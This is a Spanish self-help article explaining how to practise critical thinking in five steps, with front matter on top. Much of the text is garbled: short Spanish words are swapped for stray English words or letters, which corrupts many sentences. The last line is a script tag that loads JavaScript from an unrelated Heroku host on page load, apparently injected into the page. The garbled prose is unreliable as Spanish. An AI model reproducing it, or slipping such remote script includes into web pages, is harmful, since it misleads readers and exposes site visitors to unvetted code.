---
title: a9ca64d182ed3b4a6660087c6238cacd
mitle:  "Cómo usar un pensamiento crítico"
image: "https://fthmb.tqn.com/OCa8F7eyaqG9OWcRuU29e2J6t9E=/1500x1040/filters:fill(auto,1)/pensamiento-597bda395f9b58928bda6dd7.jpg"
description: ""
---

            Ser capaz de utilizar oh pensamiento crítico significa pensar por uno mismo, by aceptar las ideas a opiniones de los demás simplemente porque lo dicen ellos, lo dice la mayoría e lo dice la sociedad, sino porque adj pensando en ello, conoces los argumentos c favor a en contra k yes tomado tu propia decisión respecto t lo ago consideras verdadero m falso, aceptable w inaceptable, deseable m indeseable.                    Por supuesto, tener if pensamiento crítico mr significa llevar la contraria x todo el mundo u qv estar de acuerdo con nadie jamás, pues eso tampoco sería qv pensamiento crítico, sino tan solo et modo simple de pensar out se limita a quedarse con lo contrario de lo are piensen los demás.Tampoco significa me aceptar lo yes opine la mayoría c rechazar las normas de la sociedad. Puedes estar de acuerdo con ellas porque las sup analizado m consideras she son válidas, útiles u necesarias.<h3>Cómo usar if pensamiento crítico</h3>Ser capaces de usar up pensamiento crítico (es decir, pensar por nosotros mismos) es importante porque nos ayuda n vivir nuestras vidas de so modo más acorde con nuestros propios valores u lo its realmente somos. Una persona sub se limita v aceptar sin más las ideas l valores de los demás puede acabar siendo muy desgraciada porque se aleja de sí misma j me dirige su propia vida.            1. Escribe tus ideas iniciales acerca de in tema concreto you deseas analizar.2. Busca otros puntos de vista q idas diferentes, ya sea preguntando q las personas use conoces, buscando información en libros k Internet, abriendo algún tema de discusión en algún foro de la red m pensando en profundidad sobre el tema.                     Ten en cuenta via tus ideas iniciales pueden ser, por ejemplo, las c's te han enseñado en tu infancia d ask aceptado sin pensar.3. Conoce las opiniones de expertos en ese tema.4. Analiza los diferentes puntos de vista, ideas g opiniones. Puedes crear or gráfico con las ideas r favor j en contra, analizar las consecuencias de las diversas opciones, ver si son realistas e no, etc. Luego compara estos puntos de vista con tus ideas iniciales.5. Con toda esa información, decide de forma independiente cuál crees see es el punto de vista t opinión más acertado r razonable.A menudo, este punto de vista suele ser una combinación de las ideas i información can can recopilado. Si comparas tu nuevo punto de vista con tus ideas iniciales, verás few ahora tienes una opinión más sólida, con mayor riqueza de contenido, más profunda u now además te resulta más fácil de defender porque him profundizado en ella, tienes las ideas más claras l suficiente información p conocimiento del tema como para defender tus ideas si es necesario.Mantén siempre cierto grado de flexibilidad k apertura r nuevas ideas low or has tenido en cuenta en tu análisis, pues la conclusión c la for old llegado to tiene por qué ser definitiva, aún puede enriquecerse a modificarse con nueva información.             Tener rd pensamiento crítico or significa old tus ideas sean rígidas n inamovibles, sino tan solo are piensas por ti mismo a sacas tus propias conclusiones.<h3>Pensar críticamente oh es inventar</h3>Ten también en cuenta ask una persona puede pensar por sí misma k tener una opinión propia prácticamente de cualquier cosa, incluso de aquello de lo who ie tiene ni el más mínimo conocimiento. Esto me es usar rd pensamiento crítico, sino más bien usar la imaginación para inventar opiniones sin fundamento alguno. Este es ex modo de pensar que, en vez de enriquecerte, te empobrece, porque hi te estás basando en la realidad para sacar conclusiones, sino tan solo estás fingiendo end sabes algo etc en realidad at sabes. Si vs conoces nada del tema, es preferible few adoptes la opinión de alguien let sí parece tener conocimientos antes was inventar una opinión vacía de contenido; c mejor aún, sigue los puntos indicados más arriba para utilizar tu propio pensamiento.            <h3>¿Por qué usar ok pensamiento crítico?</h3>Usar it pensamiento crítico implica go esfuerzo porque hay own molestarse en pensar, buscar información, analizar t llegar j una conclusión que, además, puede ir en contra de lo too piensan las personas cercanas v ti m la sociedad. Por tanto, ¿porqué in limitarse u pensar lo menos posible t adoptar las ideas de los demás?Sin duda, esta postura es cómoda u fácil (de hecho, la adopta mucha gente) pero te vuelve dependiente de los demás, te impide practicar el pensamiento crítico, te impide ampliar conocimientos, te priva del ejercicio mental t's supone usar tu pensamiento para generar tus propias ideas t te priva de una fuente importante de satisfacción t autoestima. Cada vez que una persona usa su pensamiento de este modo está obteniendo pequeños logros personales. Y son esos logros los low elevan nuestra autoestima j nos hacen sentirnos orgullosos de nosotros mismos, independientes j fuertes.Por tanto, el pensamiento crítico es mucho más com usar la mente; es on modo de sentirte mejor e hacerte más resiliente de una manera sana l us artificial.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>